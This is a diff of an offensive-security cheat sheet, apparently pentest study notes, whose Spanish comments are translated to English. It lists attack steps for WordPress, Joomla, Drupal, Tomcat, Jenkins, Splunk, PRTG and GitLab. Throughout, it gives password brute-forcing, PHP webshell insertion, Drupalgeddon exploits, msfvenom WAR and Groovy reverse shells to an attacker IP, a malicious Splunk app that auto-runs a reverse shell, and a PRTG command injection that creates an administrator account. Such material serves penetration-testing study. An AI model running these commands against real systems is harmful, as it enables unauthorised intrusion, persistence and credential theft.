@@ -13,19 +13,19 @@ sidebar:
 ## Discovery
 
 ```bash
-# Nmap discovery inicial
+# Initial Nmap discovery
 nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
 
-# Screenshot masivo de apps web
+# Massive screenshotting of web apps
 eyewitness --web -x web_discovery.xml -d screenshots/
-cat web_discovery.xml | aquatone -nmap   # alternativa
+cat web_discovery.xml | aquatone -nmap   # alternative
 
-# Servicio individual
+# Individual service
 sudo nmap --open -sV TARGET_IP
 ```
 
 ```bash
-# Añadir vhosts al /etc/hosts
+# Add vhosts to /etc/hosts
 IP=10.129.42.195
 printf "%s\t%s\n" "$IP" "app.inlane.local dev.inlane.local blog.inlane.local" | sudo tee -a /etc/hosts
 ```
@@ -37,22 +37,22 @@ printf "%s\t%s\n" "$IP" "app.inlane.local dev.inlane.local blog.inlane.local" | 
 ### Fingerprint
 
 ```bash
-curl -s http://blog.target.local | grep WordPress    # versión en meta generator
-curl -s http://blog.target.local/ | grep themes      # tema activo
-curl -s http://blog.target.local/ | grep plugins     # plugins con versión en src
+curl -s http://blog.target.local | grep WordPress    # version in meta generator
+curl -s http://blog.target.local/ | grep themes      # active theme
+curl -s http://blog.target.local/ | grep plugins     # plugins with version in src
 
-# Robots.txt y estructura
-curl -s http://blog.target.local/robots.txt          # /wp-admin/ presente = WordPress
-# Panel admin: /wp-admin/ → /wp-login.php
+# Robots.txt and structure
+curl -s http://blog.target.local/robots.txt          # /wp-admin/ present = WordPress
+# Admin panel: /wp-admin/ -> /wp-login.php
 # Plugins: /wp-content/plugins/
-# Temas: /wp-content/themes/
+# Themes: /wp-content/themes/
 ```
 
 ```bash
-# WPScan — enumeración completa
+# WPScan — complete enumeration
 sudo wpscan --url http://blog.target.local --enumerate --api-token TOKEN
 
-# Brute force (xmlrpc es más rápido)
+# Brute force (xmlrpc is faster)
 sudo wpscan --password-attack xmlrpc -t 20 -U admin,john \
   -P /usr/share/wordlists/rockyou.txt --url http://blog.target.local
 ```
@@ -60,14 +60,14 @@ sudo wpscan --password-attack xmlrpc -t 20 -U admin,john \
 ### RCE (Admin Access)
 
 ```bash
-# Método 1: Theme Editor
-# Appearance → Theme Editor → Seleccionar tema INACTIVO (ej. Twenty Nineteen)
-# Editar 404.php → añadir: system($_GET[0]);
-# Guardar → http://target/wp-content/themes/twentynineteen/404.php?0=id
+# Method 1: Theme Editor
+# Appearance -> Theme Editor -> Select INACTIVE theme (e.g. Twenty Nineteen)
+# Edit 404.php -> add: system($_GET[0]);
+# Save -> http://target/wp-content/themes/twentynineteen/404.php?0=id
 
 curl http://blog.target.local/wp-content/themes/twentynineteen/404.php?0=id
 
-# Método 2: MSF plugin upload
+# Method 2: MSF plugin upload
 use exploit/unix/webapp/wp_admin_shell_upload
 set USERNAME john
 set PASSWORD firebird1
@@ -75,7 +75,7 @@ set RHOSTS TARGET_IP
 set VHOST blog.target.local
 exploit
 
-# Método 3: Plugin LFI (mail-masta 1.0)
+# Method 3: Plugin LFI (mail-masta 1.0)
 curl -s "http://blog.target.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
 ```
 
@@ -94,13 +94,13 @@ curl -s "http://blog.target.local/wp-content/plugins/mail-masta/inc/campaign/cou
 
 ```bash
 curl -s http://dev.target.local | grep Joomla         # meta generator
-curl -s http://dev.target.local/README.txt | head -5  # versión en "version 3.x"
+curl -s http://dev.target.local/README.txt | head -5  # version in "version 3.x"
 curl -s http://dev.target.local/administrator/manifests/files/joomla.xml | xmllint --format -
-# → <version>3.9.4</version>
+# -> <version>3.9.4</version>
 
-# Herramientas
+# Tools
 droopescan scan joomla --url http://dev.target.local/
-python2.7 joomlascan.py -u http://dev.target.local   # componentes accesibles
+python2.7 joomlascan.py -u http://dev.target.local   # accessible components
 
 # Admin panel: /administrator/
 ```
@@ -115,9 +115,9 @@ sudo python3 joomla-brute.py -u http://dev.target.local \
 ### RCE (Admin Access)
 
 ```bash
-# Template editor → Extensions → Templates → Seleccionar template → editar error.php
-# Añadir: system($_GET['HASH']);
-# Guardar → http://dev.target.local/templates/protostar/error.php?HASH=id
+# Template editor -> Extensions -> Templates -> Select template -> edit error.php
+# Add: system($_GET['HASH']);
+# Save -> http://dev.target.local/templates/protostar/error.php?HASH=id
 
 curl -s "http://dev.target.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
 
@@ -135,7 +135,7 @@ python2.7 joomla_dir_trav.py --url "http://dev.target.local/administrator/" \
 ```bash
 curl -s http://drupal.target.local | grep Drupal
 curl -s http://drupal-acc.target.local/CHANGELOG.txt | grep -m2 ""  # Drupal 7.57
-# Nodos en /node/1, /node/2... = Drupal
+# Nodes at /node/1, /node/2... = Drupal
 # Panel admin: /user/login
 
 droopescan scan drupal -u http://drupal.target.local
@@ -144,34 +144,34 @@ droopescan scan drupal -u http://drupal.target.local
 ### RCE (Admin Access)
 
 ```bash
-# Drupal 7 — Módulo PHP Filter (activar en /admin/modules)
-# Content → Add content → Basic page → Text format: PHP code
+# Drupal 7 — PHP Filter Module (enable in /admin/modules)
+# Content -> Add content -> Basic page -> Text format: PHP code
 # <?php system($_GET['HASH']); ?>
-# → http://drupal-qa.target.local/node/3?HASH=id
+# -> http://drupal-qa.target.local/node/3?HASH=id
 
-# Drupal 8+ — Instalar módulo PHP Filter
+# Drupal 8+ — Install PHP Filter module
 wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
-# Admin → Reports → Available updates → Install new module → subir tar.gz
+# Admin -> Reports -> Available updates -> Install new module -> upload tar.gz
 
 # Backdoored module (CAPTCHA)
 wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
 tar xvf captcha-8.x-1.2.tar.gz
-# Crear shell.php + .htaccess → comprimir → subir como módulo
-# Acceder: /modules/captcha/shell.php?HASH=id
+# Create shell.php + .htaccess -> compress -> upload as module
+# Access: /modules/captcha/shell.php?HASH=id
 ```
 
 ### Drupalgeddon CVEs
 
 ```bash
-# Drupalgeddon (CVE-2014-3704) — SQLi preauth → crear admin (Drupal 7.0-7.31)
+# Drupalgeddon (CVE-2014-3704) — SQLi preauth -> create admin (Drupal 7.0-7.31)
 python2.7 drupalgeddon.py -t http://drupal-qa.target.local -u hacker -p pwnd
 
 # Drupalgeddon2 (CVE-2018-7600) — RCE preauth (Drupal < 7.58 / 8.5.1)
 python3 drupalgeddon2.py
-# Modificar echo en el script para subir webshell PHP
+# Modify echo in the script to upload PHP webshell
 curl http://drupal-dev.target.local/mrb3n.php?HASH=id
 
-# Drupalgeddon3 (CVE-2018-7602) — RCE autenticado (MSF)
+# Drupalgeddon3 (CVE-2018-7602) — Authenticated RCE (MSF)
 use exploit/multi/http/drupal_drupageddon3
 set drupal_session SESS45ecfcb93...=TOKEN
 set DRUPAL_NODE 1
@@ -185,14 +185,14 @@ exploit
 ### Fingerprint
 
 ```bash
-# Error 404 revela versión; también /docs/
+# Error 404 reveals version; also /docs/
 curl -s http://target:8080/docs/ | grep Tomcat
 
-# Estructura clave
-# /manager/html → WAR upload (requiere manager-gui)
+# Key structure
+# /manager/html -> WAR upload (requires manager-gui)
 # /host-manager/html
-# conf/tomcat-users.xml → credenciales (si accesible via LFI)
-# webapps/ → directorio de aplicaciones
+# conf/tomcat-users.xml -> credentials (if accessible via LFI)
+# webapps/ -> application directory
 ```
 
 ### Manager Brute Force
@@ -206,44 +206,44 @@ set stop_on_success true
 set rhosts TARGET_IP
 run
 
-# Credenciales comunes Tomcat
+# Common Tomcat credentials
 # tomcat:tomcat, tomcat:admin, admin:admin, admin:manager, manager:manager
 ```
 
 ### WAR Upload → RCE
 
 ```bash
-# Método manual
+# Manual method
 wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
 zip -r backup.war cmd.jsp
-# Manager GUI → Deploy → subir backup.war
-# → http://target:8080/backup/cmd.jsp?cmd=id
+# Manager GUI -> Deploy -> upload backup.war
+# -> http://target:8080/backup/cmd.jsp?cmd=id
 
 # msfvenom WAR
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=OUR_IP LPORT=4443 -f war > backup.war
 nc -lnvp 4443
-# Subir WAR → click /backup en el Manager
+# Upload WAR -> click /backup in the Manager
 
-# MSF automático
+# Automatic MSF
 use exploit/multi/http/tomcat_mgr_upload
 ```
 
 ### CVE-2020-1938 Ghostcat (AJP LFI — Tomcat < 9.0.31)
 
 ```bash
-nmap -sV -p 8009,8080 target           # verificar AJP en 8009
+nmap -sV -p 8009,8080 target           # verify AJP on 8009
 python2.7 tomcat-ajp.lfi.py target -p 8009 -f WEB-INF/web.xml
-# Solo lee archivos dentro de webapps/
+# Only reads files inside webapps/
 ```
 
 ### CVE-2019-0232 (CGI enableCmdLineArguments — Windows)
 
 ```bash
-# Encontrar scripts CGI
+# Find CGI scripts
 ffuf -w /usr/share/dirb/wordlists/common.txt -u http://target:8080/cgi/FUZZ.cmd
 ffuf -w /usr/share/dirb/wordlists/common.txt -u http://target:8080/cgi/FUZZ.bat
 
-# Command injection vía query string (Windows)
+# Command injection via query string (Windows)
 curl "http://target:8080/cgi/script.bat?&dir"
 curl "http://target:8080/cgi/script.bat?&whoami"
 ```
@@ -255,10 +255,10 @@ curl "http://target:8080/cgi/script.bat?&whoami"
 ### Fingerprint
 
 ```bash
-# Puerto defecto: 8080 (también 8000)
-# Puerto slave: 5000
-# Login en /login → base de datos propia de Jenkins o LDAP
-# Probar admin:admin o acceso sin autenticación
+# Default port: 8080 (also 8000)
+# Slave port: 5000
+# Login at /login -> Jenkins own database or LDAP
+# Test admin:admin or access without authentication
 ```
 
 ### RCE — Script Console
@@ -268,7 +268,7 @@ http://jenkins.target.local:8000/script
 ```
 
 ```groovy
-// Linux — ejecutar comando
+// Linux — execute command
 def cmd = 'id'
 def sout = new StringBuffer(), serr = new StringBuffer()
 def proc = cmd.execute()
@@ -283,7 +283,7 @@ p.waitFor()
 ```
 
 ```groovy
-// Windows — ejecutar comando
+// Windows — execute command
 def cmd = "cmd.exe /c whoami".execute();
 println("${cmd.text}");
 
@@ -296,7 +296,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ```bash
 nc -lvnp 8443   # listener
-# MSF alternativo:
+# Alternative MSF:
 use exploit/multi/http/jenkins_script_console
 ```
 
@@ -307,9 +307,9 @@ use exploit/multi/http/jenkins_script_console
 ### Fingerprint
 
 ```bash
-# Puerto: 8000 (web), 8089 (management REST API)
-# Credenciales defecto: admin:changeme (versiones antiguas)
-# Trial gratuito → Free sin autenticación tras 60 días
+# Port: 8000 (web), 8089 (management REST API)
+# Default credentials: admin:changeme (old versions)
+# Free trial -> Free without authentication after 60 days
 
 sudo nmap -sV TARGET_IP | grep -i splunk
 ```
@@ -317,7 +317,7 @@ sudo nmap -sV TARGET_IP | grep -i splunk
 ### RCE — Custom App (Scripted Input)
 
 ```bash
-# Estructura del app malicioso
+# Malicious app structure
 mkdir -p splunk_shell/{bin,default}
 
 # bin/rev.py (Linux)
@@ -334,7 +334,7 @@ EOF
 # bin/run.ps1 (Windows)
 # $client = New-Object System.Net.Sockets.TCPClient('OUR_IP',443);...
 
-# bin/run.bat (Windows — lanzador)
+# bin/run.bat (Windows — launcher)
 echo '@ECHO OFF' > splunk_shell/bin/run.bat
 echo 'PowerShell.exe -exec bypass -w hidden -Command "& '"'"'%~dpn0.ps1'"'"'"' >> splunk_shell/bin/run.bat
 echo 'Exit' >> splunk_shell/bin/run.bat
@@ -352,11 +352,11 @@ sourcetype = shell
 interval = 10
 EOF
 
-# Comprimir y subir
+# Compress and upload
 tar -cvzf updater.tar.gz splunk_shell/
 
-# Splunk GUI: Apps → Install app from file → subir updater.tar.gz
-# Automáticamente ejecuta el script → reverse shell
+# Splunk GUI: Apps -> Install app from file -> upload updater.tar.gz
+# Automatically executes the script -> reverse shell
 sudo nc -lnvp 443
 ```
 
@@ -367,24 +367,24 @@ sudo nc -lnvp 443
 ### Fingerprint
 
 ```bash
-# Puerto: 8080 (o 80/443)
-# Identificar: "Paessler PRTG" en headers Nmap o EyeWitness
-# Credenciales defecto: prtgadmin:prtgadmin
-# Versión en: http://TARGET:8080/index.htm (grep "version")
+# Port: 8080 (or 80/443)
+# Identify: "Paessler PRTG" in Nmap or EyeWitness headers
+# Default credentials: prtgadmin:prtgadmin
+# Version in: http://TARGET:8080/index.htm (grep "version")
 curl -s http://TARGET:8080/index.htm -A "Mozilla/5.0" | grep version
 ```
 
 ### CVE-2018-9276 — Authenticated Command Injection
 
 ```bash
-# PRTG < 18.2.39 — inyección en campo Parameter de notificaciones
-# Setup → Account Settings → Notifications → Add new notification
-# → Tick "EXECUTE PROGRAM"
-# → Program File: "Demo exe notification - outfile.ps1"
-# → Parameter: test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
-# → Save → Test (ejecuta el comando)
+# PRTG < 18.2.39 — injection in notification Parameter field
+# Setup -> Account Settings -> Notifications -> Add new notification
+# -> Tick "EXECUTE PROGRAM"
+# -> Program File: "Demo exe notification - outfile.ps1"
+# -> Parameter: test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
+# -> Save -> Test (executes the command)
 
-# Verificar acceso local admin
+# Verify local admin access
 sudo crackmapexec smb TARGET_IP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
 ```
 
@@ -397,20 +397,20 @@ sudo crackmapexec smb TARGET_IP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
 ```bash
 # Login: /users/sign_in
 # Admin panel: /admin
-# Explorar público: /explore
-# Versión: solo en /help (requiere login)
+# Explore public: /explore
+# Version: only in /help (requires login)
 
-# Enumeración de usuarios (si permite registro)
+# User enumeration (if self-registration is enabled)
 ./gitlab_userenum.sh --url http://gitlab.target.local:8081/ --userlist users.txt
 
-# Username válido si responde 200; inválido si 302
-# Error en registro "Username is already taken" → confirma usuario existente
+# Valid username if 200 response; invalid if 302
+# Registration error "Username is already taken" -> confirms existing user
 ```
 
 ### Authenticated RCE (GitLab CE 13.10.2 — CVE-2021-22205)
 
 ```bash
-# ExifTool metadata RCE vía imagen subida
+# ExifTool metadata RCE via uploaded image
 python3 gitlab_13_10_2_rce.py \
   -t http://gitlab.target.local:8081 \
   -u hacker -p Password1 \
@@ -426,12 +426,12 @@ nc -lnvp 8443
 ### Attacks
 
 ```bash
-# Si permite crear tickets: obtener email de empresa asignado al ticket
-# → usar ese email para registrarse en otros servicios (Slack, GitLab, etc.)
+# If ticket creation is allowed: obtain internal company email assigned to the ticket
+# -> use that email to register on other services (Slack, GitLab, etc.)
 
-# Si se tienen credenciales de user de soporte:
-# Buscar tickets con contraseñas en texto claro (password resets, etc.)
-# Exportar libreta de direcciones → lista de usuarios para password spray
+# If support user credentials are held:
+# Search tickets for cleartext passwords (password resets, etc.)
+# Export address book -> user list for password spray
 ```
 
 ---
